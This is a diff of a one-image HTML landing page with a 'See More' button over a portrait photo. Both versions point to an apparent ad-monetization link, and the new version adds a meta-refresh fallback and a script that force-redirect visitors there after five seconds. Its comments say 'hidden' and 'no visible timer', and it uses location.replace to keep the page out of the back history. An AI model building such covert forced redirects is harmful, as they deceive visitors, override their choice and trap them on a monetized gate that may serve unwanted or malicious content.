@@ -1,4 +1,4 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="utf-8" />
@@ -6,147 +6,162 @@
       name="viewport"
       content="width=device-width, initial-scale=1, viewport-fit=cover"
     />
-    <title>Image Card - See More Overlay</title>
+    <title>Image with Bottom-Left Button</title>
+
+     Fallback: hidden 5s auto-redirect even if JS is off 
     <meta
       http-equiv="refresh"
       content="5;url=https://www.revenuecpmgate.com/ipkpuuud08?key=1756b02182daa3e03505a06e107f2ba0"
     />
+
     <style>
-      /* Minimal reset and color tokens */
+      /* Color system: primary accent orange, neutral white/black variants */
       :root {
-        --bg: #0f172a;          /* slate-900 */
-        --card: #111827;        /* gray-900 */
-        --text: #ffffff;        /* white */
-        --button: #f97316;      /* orange-500 */
-        --button-hover: #ea580c;/* orange-600 */
-        --shadow: 0 10px 25px rgba(0, 0, 0, 0.35);
+        --accent: #ff6a3d;   /* orange button */
+        --accent-end: #ff835a;
+        --text-on-accent: #ffffff;
+        --img-shadow: 0 8px 30px rgba(0, 0, 0, 0.25);
       }
-      * { box-sizing: border-box; }
-      html, body { height: 100%; }
+
+      html,
+      body {
+        height: 100%;
+      }
+
       body {
         margin: 0;
-        background: #1e293b; /* solid background for contrast */
-        color: var(--text);
-        font-family: system-ui, -apple-system, Segoe UI, Roboto, Inter, Arial, sans-serif;
         display: grid;
         place-items: center;
-        padding: 20px;
+        background: #0b0b0c;
+        color: #111;
+        font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
       }
 
-      /* Card with rounded corners and shadow */
+      /* Wrapper maintains only the image on the page */
       .card {
         position: relative;
-        width: min(92vw, 420px);
-        border-radius: 22px;
+        border-radius: 18px;
         overflow: hidden;
-        box-shadow: var(--shadow);
-        background: var(--card);
-        isolation: isolate;
+        box-shadow: var(--img-shadow);
+        max-width: 520px;
+        width: min(92vw, 520px);
+        line-height: 0; /* remove stray gaps around image */
       }
 
-      /* Image fills card */
       .card img {
         display: block;
         width: 100%;
         height: auto;
+        object-fit: cover;
+        aspect-ratio: 9 / 16; /* keeps a tall poster-like feel on wide screens */
       }
 
-      /* Soft bottom gradient for legibility (button area) */
+      /* Optional subtle gradient at the very bottom for contrast (no text) */
       .bottom-fade {
         position: absolute;
         inset: auto 0 0 0;
-        height: 40%;
-        background: linear-gradient(to top, rgba(0,0,0,0.45), rgba(0,0,0,0));
-        pointer-events: none; /* let clicks pass through */
+        height: 28%;
+        background: linear-gradient(
+          to top,
+          rgba(0, 0, 0, 0.45),
+          rgba(0, 0, 0, 0.12),
+          transparent
+        );
+        pointer-events: none;
       }
 
-      /* Overlay group to place the button at bottom-left like the screenshot */
-      .controls {
+      /* Bottom-left pill button over the image */
+      .cta {
         position: absolute;
         left: 16px;
         bottom: 16px;
-        display: flex;
-        gap: 12px;
-        align-items: center;
-        z-index: 2;
-      }
-
-      /* Pill button styling (always visible) */
-      .btn {
-        -webkit-tap-highlight-color: transparent;
-        appearance: none;
+        background: linear-gradient(135deg, var(--accent), var(--accent-end));
+        color: var(--text-on-accent);
         border: none;
-        background: var(--button);
-        color: var(--text);
-        padding: 12px 18px;
         border-radius: 999px;
-        font-weight: 600;
+        padding: 12px 18px;
         font-size: 16px;
-        box-shadow: 0 6px 18px rgba(249, 115, 22, 0.35);
-        cursor: pointer;
-        transition: background-color 160ms ease, transform 120ms ease;
+        font-weight: 700;
+        text-decoration: none;
+        box-shadow: 0 6px 18px rgba(255, 106, 61, 0.45);
+        transition: transform 0.15s ease, box-shadow 0.15s ease;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        -webkit-tap-highlight-color: transparent;
       }
-      .btn:active { transform: translateY(1px); }
-      .btn:hover { background: var(--button-hover); }
 
-      /* Small caption under card (optional) */
-      .caption {
-        text-align: center;
-        color: rgba(255,255,255,0.75);
-        font-size: 14px;
-        margin-top: 12px;
+      .cta:active,
+      .cta:hover {
+        transform: translateY(-1px);
+        box-shadow: 0 10px 24px rgba(255, 106, 61, 0.52);
+      }
+
+      /* Respect safe areas on iOS when in standalone/PWA */
+      @supports (padding: max(0px)) {
+        .cta {
+          left: max(16px, env(safe-area-inset-left));
+          bottom: max(16px, env(safe-area-inset-bottom));
+        }
       }
     </style>
   </head>
   <body>
-    <main class="card" role="region" aria-label="Image with See More action">
-       Image source must use the provided Source URL 
+     Only the image with an overlaid bottom-left button 
+    <main class="card" aria-label="Promoted image">
       <img
         src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/photo_30_2025-09-02_14-22-31.jpg-9TdZcAWQi6etjaGVbFgwmbpvryGrtJ.jpeg"
-        alt="Portrait of a woman in a red dress standing on a mountain path near a lake"
+        alt="Portrait of a woman in a red dress standing by a mountain lake."
       />
-
-       Subtle bottom fade to help button contrast 
       <div class="bottom-fade" aria-hidden="true"></div>
-
-       Always-visible button placed bottom-left over the image 
-      <div class="controls">
-        <a
-          id="seeMore"
-          class="btn"
-          href="https://www.revenuecpmgate.com/ipkpuuud08?key=1756b02182daa3e03505a06e107f2ba0"
-          rel="nofollow noopener"
-        >
-          See More
-        </a>
-      </div>
+      <a
+        id="seeMore"
+        class="cta"
+        href="https://www.revenuecpmgate.com/ipkpuuud08?key=1756b02182daa3e03505a06e107f2ba0"
+        rel="noopener"
+      >
+        See More
+      </a>
     </main>
 
-    <p class="caption">Button position matches your screenshot layout.</p>
-
     <script>
-      // Uses same-tab navigation for reliability on mobile.
+      // Mobile-friendly auto-redirect after 5 seconds, no visible timer
       (function () {
-        const TARGET =
+        const target =
           "https://www.revenuecpmgate.com/ipkpuuud08?key=1756b02182daa3e03505a06e107f2ba0";
+        const btn = document.getElementById("seeMore");
         let navigated = false;
 
-        function go(url) {
+        function go(now = false) {
           if (navigated) return;
           navigated = true;
-          // Prefer same-tab for mobile reliability
-          window.location.href = url;
+          // Same-tab navigation is most reliable on mobile
+          if (now) {
+            window.location.href = target;
+          } else {
+            // replace avoids keeping this page in the back stack
+            window.location.replace(target);
+          }
         }
 
-        // Button click - immediate navigation
-        document.getElementById("seeMore")?.addEventListener("click", function (e) {
-          // If user clicks before timer, prevent double work
-          e.preventDefault();
-          go(TARGET);
+        // Immediate navigate on click/tap
+        btn.addEventListener("click", function (e) {
+          // Allow native anchor behavior, but ensure single navigation
+          if (navigated) {
+            e.preventDefault();
+            return;
+          }
+          navigated = true;
+          // Let the default href handle it; as backup, force navigate
+          setTimeout(() => {
+            if (document.visibilityState !== "hidden") {
+              window.location.href = target;
+            }
+          }, 50);
         });
 
-        // Auto-redirect after 5 seconds
-        setTimeout(() => go(TARGET), 5000);
+        // Hidden auto-redirect in 5 seconds
+        setTimeout(() => go(false), 5000);
       })();
     </script>
   </body>
